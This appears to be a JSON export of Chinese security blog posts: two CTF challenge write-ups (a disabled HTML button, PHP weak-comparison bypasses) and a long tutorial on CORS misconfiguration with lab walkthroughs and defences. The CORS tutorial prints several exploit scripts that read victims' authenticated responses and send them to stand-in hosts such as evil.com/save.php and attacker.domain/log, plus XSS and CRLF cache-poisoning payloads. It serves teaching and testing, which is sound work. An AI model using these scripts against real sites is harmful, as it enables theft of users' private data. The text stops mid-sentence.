[{"title":"攻防世界-disabled_button","url":"/2023/07/27/disabled_button/","content":"题目描述：\nX老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n题目解题：\n首先进入题目发现如下页面：\n\n根据已有的题目信息，我们猜测大概率是要想方法成功点击flag按钮即可，结合题目描述，我们要借助前端知识。\n首先查看了源代码\n\n我们看到这里在flag按钮处有一个disabled属性，这导致了他的不可点击，接下来先上一手GPT回答\n&lt;input disabled class=&quot;btn btn-default&quot; style=&quot;height:50px;width:200px;&quot; type=&quot;submit&quot; value=&quot;flag&quot; name=&quot;auth&quot; /&gt;：    一个输入元素，type为&quot;submit&quot;，表示提交按钮；    name为&quot;auth&quot;；    value为&quot;flag&quot;，显示在按钮上的文本；    disabled属性设置为&quot;disabled&quot;，使按钮不可点击；    class为&quot;btn btn-default&quot;，这个class来自之前引用的Bootstrap样式表，用于设置按钮的样式；    style属性设置了按钮的高度和宽度。\n也就是说我们需要想办法去掉disabled这个属性，那么很明显我们直接F12进控制台修改即可\n\n只需将上图的disabled属性去除即可\n\n可以发现按钮亮度变量，即我们可以点击了，不过我再第一次点击的时候仍然没反应，页面直接刷新到初始状态，由此我们尝试bp抓包\n\n如上图成功拿到flag\n","categories":["攻防世界"]},{"title":"攻防世界-simple_php","url":"/2023/07/27/simple_php/","content":"题目描述：\n小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n题目解题：\n打开页面后，发现简单的PHP代码，开始审计\n&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123;    echo $flag1;&#125;if(is_numeric($b))&#123;    exit();&#125;if($b&gt;1234)&#123;    echo $flag2;&#125;?&gt;\n如上代码我们可以发现，如果’a==0‘为true，但a本身不是0，则输出一部分flag，接下来判断b，如果b不是数字，且b大于1234，则输出剩下部分的flag\n首先a是一个弱类型比较，而比较有如下情况\nvar_dump(&#x27;a&#x27; == 0);\t//bool(true)var_dump(&#x27;1a&#x27; == 1);\t//bool(true)var_dump(&#x27;12a&#x27; == 1);\t//bool(false)1. 字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。2. 但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。 \n那很明显我们令a=a即可绕过\n针对b利用的是is_numeric函数特性\n\n方法一\n利用数组+十六进制来进行绕过，此方法由于is_numeric函数不能处理数组，那么该函数会返回false\nb[]=58B\n方法二\n\nb=1235%20b=1235%00\n方法三\nphp中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过\nb=1235a\n此函数若是在sql注入中碰到也可以用16进制来绕过，将sql语句转为16进制字符串即可\n如下图成功得到flag\n\n","categories":["攻防世界"]},{"title":"CORS跨域漏洞","url":"/2023/07/26/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/","content":"CORS跨域漏洞\n0x01 漏洞简介\n​\t\t跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享 CORS 漏洞主要是由于程序员配置不当，对于 Origin 源校验不严格，从而造成跨域问题，攻击者可以利用 CORS 错误配置漏洞，从恶意网站跨域读取受害网站的敏感信息。\n​\t\t是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。\n同源策略\n​\t\t这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。源由通信协议，域和端口号组成。\n​\t\tSOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。\n简单来说:同时满足同协议，同域名，同端口这三个条件，就是同源。\n\t\t浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。\n\nSOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。\n\n跨域访问的一些场景\n\n比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。\n程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。\n电商网站想通过用户浏览器加载第三方快递网站的物流信息。\n子站域名希望调用主站域名的用户资料接口，并将数据显示出来。\n\n跨域请求方式\nCORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。\n请求方法是以下三种方法之一：- HEAD- GET- POST\nHTTP的头信息不超出以下几种字段：- `Accept`- `Accept-Language`- `Content-Language`- `Last-Event-ID`- `Content-Type`：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`\n简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。\n浏览器对简单请求和非简单请求的处理机制不一样。\n对于简单请求，浏览器就会立刻发送这个请求。\n对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。\n0x02 CORS跨域原理及漏洞成因\n​\t\t浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。\n​\t\t对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。当服务器接收到请求后发现Origin字段指定的域名在许可范围内，服务器会在响应包中增加三个与CORS相关的字段，Access-Control-Allow-Origin、Access-Control-Allow-Credentials、Access-Control-Expose-Headers。其中Access-Control-Allow-Origin字段是必须存在的，它的值可能是Origin字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大。再回到三个字段上，其中Access-Control-Allow-Credentials字段不是必选字段，它的值是一个布尔值且只能设置为true，表示服务器允许浏览器将cookie包含在请求中，否则就不添加此字段。但需要注意的是，如果要发送cookie，Access-Control-Allow-Origin就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略。而Access-Control-Expose-Headers字段主要是指定想要获取XMLHttpRequest对象中getResponseHeader（）方法的其他服务器字段。\n​\t\t所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。\n​\t\tCORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。\n0x03 CORS漏洞攻击流程\n\n1.假设用户登陆一个含有CORS配置网站foo.com，同时又访问了攻击者提供的一个链接evil.com。\n2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。\n3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。\nhttp://foo.com/index.php代码如下\nhttp://foo.com/phpinfo.php代码如下\n\n在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。\n\n然后构造黑客发生送给用户的恶意页面http://evil.com/steal.html\n&lt;!DOCTYPE&gt;&lt;html&gt;&lt;h1&gt;CORS test&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt;function loadXMLDoc()&#123;    var xhr1;    var xhr2;\t    if(window.XMLHttpRequest)    &#123;        xhr1 = new XMLHttpRequest();        xhr2 = new XMLHttpRequest();    &#125;    else    &#123;        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);    &#125;    xhr1.onreadystatechange=function()    &#123;        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response        &#123;            var datas=xhr1.responseText;            xhr2.open(&quot;POST&quot;,&quot;http://evil.com/save.php&quot;,&quot;true&quot;);\t\t\talert(&#x27;3&#x27;);            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded;charset=utf-8&quot;);            xhr2.send(&quot;T1=&quot;+escape(datas));              &#125;    &#125;    xhr1.open(&quot;GET&quot;,&quot;http://foo.com/phpinfo.php&quot;,&quot;true&quot;) //request user page.    alert(xhr1.responseText);\txhr1.withCredentials = true;        //request with cookie    xhr1.send();&#125;loadXMLDoc();&lt;/script&gt;&lt;/html&gt;\n当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。\n\n接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。evil.com/save.php代码如下：\n\n黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。\n\n但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。\n\n去掉foo.com/phpinfo.php服务端的注释\n\n重新访问http://evil.com/steal.html\n\n发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，随后js脚本把页面编码后发送到evil.com/save.php去\n模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。\n\n0x04 修复及防御方式\n1.仔细评估是否开启CORS，如果不必要就不要开启CORS2.如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。3.仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS4.要尽可能的返回&quot;Vary: Origin&quot;这个头部，以避免攻击者利用浏览器缓存5.如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。6.限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。7.限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。8.仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。\n0x05 简单请求的示例\n跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。\n例如下面的来自站点 http://example.com 的网页应用想要访问 http://bar.com 的资源：\nrequests\n1  GET /resources/public-data/ HTTP/1.12  Host: bar.com3  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre4  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.85  Accept-Language: en-us,en;q=0.56  Accept-Encoding: gzip,deflate7  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.78  Connection: keep-alive9  Referer: http://example.com/examples/access-control/simpleXSInvocation.html10 Origin: http://example.com\nresponse\n11  HTTP/1.1 200 OK12  Date: Mon, 01 Dec 2020 00:23:53 GMT13  Server: Apache/2.0.61 14  Access-Control-Allow-Origin: *15  Keep-Alive: timeout=2, max=10016  Connection: Keep-Alive17  Transfer-Encoding: chunked18  Content-Type: application/xml\n第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 http://example.com。\n第 11~18 行是来自于 http://bar.com 的服务端响应。响应中携带了响应首部字段 Access-Control-Allow-Origin（第 14 行）。使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。本例中，服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 http://example.com 的访问，该首部字段的内容如下：\nAccess-Control-Allow-Origin: http://example.com\n如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段：\nAccess-Control-Allow-Credentials: true\n这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）\n0x06 漏洞利用\n这里以droabox靶场为例\n\n这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞\n\n接下来我们就可以建立一个恶意的js代码\n&lt;!-- cors.html --&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;cors exp&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function cors() &#123;  var xhttp = new XMLHttpRequest();  xhttp.onreadystatechange = function() &#123;        if (this.status == 200) &#123;        alert(this.responseText);         document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;    //作用解释如下    &#125;  &#125;;  xhttp.open(&quot;GET&quot;, &quot;http://192.168.0.101/DoraBox/csrf/userinfo.php&quot;);  xhttp.withCredentials = true;  xhttp.send();&#125;cors();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n//document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;这段代码的作用是将 this.responseText 的内容设置为具有 id &quot;demo&quot; 的元素的内部 HTML。具体解释如下：document.getElementById(&quot;demo&quot;) 是一个 DOM 方法，它通过元素的 id 属性获取对应的 HTML 元素。在这个例子中，它获取具有 id &quot;demo&quot; 的元素。.innerHTML 是获取或设置 HTML 元素的内部 HTML 内容的属性。通过将等号右侧的值赋给它，可以更新元素的内部 HTML 内容。this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返回的响应文本。因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id &quot;demo&quot; 的元素的内部 HTML 内容。这样，在网页中具有 id &quot;demo&quot; 的元素会显示服务器返回的文本内容。\n访问这个页面就可以获取已登录的用户的信息\n\n该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。\n0x07 漏洞发现技巧\n在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，\nCORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。\n方式一: BurpSuite\n一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。\n方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。\n\n在Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org\n\nHTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。\n\n组合应是这种：\nAccess-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true\n注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。\nAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true\n当我们进行测试时，看服务器响应头字段里可以关注这几个点：\n最好利用的配置：\nAccess-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true\n可能存在可利用的配置：\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n很好的条件但无法利用：\n下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n单一的情况\n方式二: Access-Control-Allow-Origin：\ncurl命令，输入curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H &quot;Origin:https://example.com/&quot; -I\n\n如果出现这种组合，说明存在CORS漏洞\nAccess-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true\n方式三: 使用CORScanner工具(漏洞自动化扫描)\ngithub上提供了一个关于扫描CORS配置漏洞的脚本\nhttps://github.com/chenjj/CORScanner\nCORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。\n\n总结漏洞的原因：\n1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。\n2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。\n安全隐患\n这个流程中。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说。在支持CORS的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。\n如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么CORS的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。\n0x08 其他可能利用漏洞的地方\n8.1 解析Origin头时出错\n一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现。收到CORS请求后，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标题中，以便授予访问权限。例如，web应用收到一个正常的请求：\nGET /data HTTP/1.1Host: bar.com...Origin: https://example.com\nweb应用根据其允许的来源列表检查当前请求资源的来源，如果在列表中，则按以下方式反映该来源：\nHTTP/1.1 200 OK...Access-Control-Allow-Origin: https://example.com\n但在检测来源是否存在于白名单时经常可能出现问题，一些网站可能会允许其所有的子域（包括尚未存在未来可能存在的子域）来进行访问，或者允许其他网站的域以及其子域来访问请求。这些请求一般都通过通配符或者正则表达式来完成，但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限。例如：\n例如，假设一个应用程序授予对以下列结尾的所有域的访问权限：\nexample.com\n攻击者可能可以通过注册域来获得访问权限：\nexeexample.com\n或者，假设应用程序授予对所有以example.com开头的域访问权限，攻击者就可以使用该域获得访问权限：\nexample.com.evil-user.net\n8.2 利用相互受CORS信任的域来进行XSS\n假如两个互相受信任的源，如果其中一个网站存在XSS，攻击者就可以利用XSS注入一些JavaScript代码，利用这些代码对信任其源的另一个网站进行敏感信息的获取。\n如果进行CORS请求时网站响应：\nHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://vulnerable.comAccess-Control-Allow-Credentials: true\n就可以利用XSS漏洞在vulnerable.com网站上使用下面的URL来通过检索API密钥：\nhttps://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;\n8.3 白名单中的null值\nCORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在RFC 6564中被定义。RFC 6564规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。\nCORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求构造的Origin为null值。这将满足白名单的要求，从而导致跨域访问。例如，可以使用iframe以下格式的沙盒跨域请求来完成：\n&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,&lt;script&gt;var req = new XMLHttpRequest();req.onload = reqListener();req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true);req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;&#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;\n这就意味着任何配置有Access-Control-Allow-Origin: null和Access-Control-Allow-Credentials:true的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。\n0x09 利用CORS漏洞(偏实际环境)\n流程:\n\n假设用户登陆一个含有CORS配置网站vuln.com，同时又访问了攻击者提供的一个链接evil.com。\nevil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。\n如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。\n\n方式一：存在用户凭证\n\n详细过程\n\n\n创建一个JavaScript脚本去发送CORS请求，poc关键代码如下：\n   var req = new XMLHttpRequest();    req.onload = reqListener();    req.open(“get”,”https://vulnerable.domain/api/private-data”,true);    req.withCredentials = true;   req.send();    function reqListener() &#123;    location=”//attacker.domain/log?response=”+this.responseText;    &#125;;2. 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在CORS配置的服务器。```httpGET /api/private-data HTTP/1.1 Host: vulnerable.domain Origin: https://attacker.domain/ Cookie: JSESSIONID=&lt;redacted&gt;```3. 响应包```httpHTTP/1.1 200 OK Server: Apache-Coyote/1.1 Access-Control-Allow-Origin: https://attacker.domain Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials Vary: Origin Expires: Thu, 01 Jan 1970 12:00:00 GMT Last-Modified: Wed, 02 May 2018 09:07:07 GMT Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 Pragma: no-cache Content-Type: application/json;charset=ISO-8859-1 Date: Wed, 02 May 2018 09:07:07 GMT Connection: close Content-Length: 149 &#123;&quot;id&quot;:1234567,&quot;name&quot;:&quot;Name&quot;,&quot;surname&quot;:&quot;Surname&quot;,&quot;email&quot;:&quot;email@target.local&quot;,&quot;account&quot;:&quot;ACT1234567&quot;,&quot;balance&quot;:&quot;123456,7&quot;,&quot;token&quot;:&quot;to p-secret-string&quot;&#125;```3. 因为服务器发送了右边的“ Access-Control-Allow- *”给客户端，所以，攻击的浏览器允许包含恶意的JavaScript代码的页面访问用户的隐私数据。#### 方式二：不存在用户凭证![image-20230510212310583](CORS跨域漏洞/image-20230510212310583.png)**详细过程**1. 攻击方式1：绕过基于IP的认证   如果目标应用程序与受害者的网络可达性，并且目标应用程序使用IP地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于IP的身份验证。2. 攻击方式2：客户端缓存中毒   例如，数据报文头部中包含`X-User`标头，其值未进行任何输入验证，输出编码。   请求包```httpGET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: &lt;svg/onload=alert(1)&gt;```响应包`Access-Control-Allow-Origin`已被设置，`Access-Control-Allow-Credentials: true`与`Vary: Origin`头适合设置```httpHTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: &lt;svg/onload=alert(1)&gt;```构造存在恶意的XSS有效负载页面，诱使受害者触发。```JavaScriptvar req = new XMLHttpRequest(); req.onload = reqListener;req.open(&#x27;get&#x27;,&#x27;http://www.target.local/login&#x27;,true); req.setRequestHeader(&#x27;X-User&#x27;, &#x27;&lt;svg/onload=alert(1)&gt;&#x27;);req.send(); function reqListener() &#123; location=&#x27;http://www.target.local/login&#x27;; &#125;```1. 攻击方式3：服务器端缓存中毒   利用CORS的错误配置注入任意HTTP头部，将其保存在服务器端缓存中，可用于构造存储类型XSS。   利用条件：存在服务器端缓存，能够反射`Origin`头部，不会检查`Origin`头部中的特殊字符，如`\\r`   利用方式：攻击IE / Edge用户（IE / Edge使用`\\r`作为的HTTP标题段的终结符）请求包```httpGET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7```回车（CR）：ASCII码：&#x27;\\r&#x27; ，十六进制：0x0d响应包```httpHTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7```如果攻击者能提前发送畸形的`Origin`消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为`UTF-7`，可引发XSS中断。#### 类型21.描述在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。2.挖掘同上3.利用1,交互式xss。通过CORS，绕过一些反会话劫持的方法，如HTTP-Only限制的cookie，绑定IP地址的会话ID等，劫持用户会话。2,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。## 0x10 预防CORS漏洞CORS漏洞主要是由于配置错误而引起的。所以，预防漏洞变成了一个配置问题。下面介绍了一些针对CORS攻击的有效防御措施。1. 正确配置跨域请求   如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。2. 只允许信任的网站   看起来似乎很明显，但是Access-Control-Allow-Origin中指定的来源只能是受信任的站点。特别是，使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。3. 避免将null列入白名单   避免使用标题Access-Control-Allow-Origin: null。来自内部文档和沙盒请求的跨域资源调用可以指定null来源。应针对私有和公共服务器的可信来源正确定义CORS头。4. 避免在内部网络中使用通配符   避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。5. CORS不能替代服务器端安全策略   CORS定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的CORS之外，Web服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。## 0x11 CORS靶场练习该靶场内置了3个 CORS 的漏洞场景- 场景一：信任任意 Origin 源- 场景二：正则表达式检测 Origin 源- 场景三：信任任意 null 源![image-20230510214108156](CORS跨域漏洞/image-20230510214108156.png) 漏洞检测: 一般情况下，修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在。#### 场景一：信任任意 Origin 源应用程序接受来自任何 Origin 的 CORS 请求。该代码将 Origin 值放在 HTTP 响应头 Access-Control-Allow-Origin 中。现在，此配置将允许来自任何 Origin 的任何脚本向应用程序发出 CORS 请求。Web 浏览器将执行标准的 CORS 请求检查，来自恶意域的脚本将能够窃取数据。应用程序接受 Origin 标头中指定的任何值。![image-20230510215219591](CORS跨域漏洞/image-20230510215219591.png)可以看到箭头处的域名,是任意的,而该网站都允许域名发出请求并回显(origin处是我自己添加的)#### 场景二：正则表达式检测 Origin 源应用程序已实施 CORS 策略并对列入白名单的域/子域执行“正则表达式”检查。在这种情况下，应用程序在代码中具有弱正则表达式实现，它只检查 HTTP 请求 Origin 标头中任何位置的域名 b0x.com 的存在。如果 HTTP 标头 Origin 的值为 inb0x.com 或 b0x.comlab.com，正则表达式会将其标记为通过。这种错误配置将导致跨源共享数据。**应用程序信任列入白名单的 Origin。**![image-20230510215728867](CORS跨域漏洞/image-20230510215728867.png)**应用程序不允许任何任意来源, 可以看到下图右侧没有CORS头**![image-20230510215801410](CORS跨域漏洞/image-20230510215801410.png)应用程序弱正则表达式允许在域名开头具有白名单域字符串的 Origin。![image-20230510215958783](CORS跨域漏洞/image-20230510215958783.png)应用程序弱正则表达式允许在域名末尾具有白名单域字符串的 Origin。![image-20230510220029500](CORS跨域漏洞/image-20230510220029500.png)#### 场景三：信任null源在这种情况下，应用程序 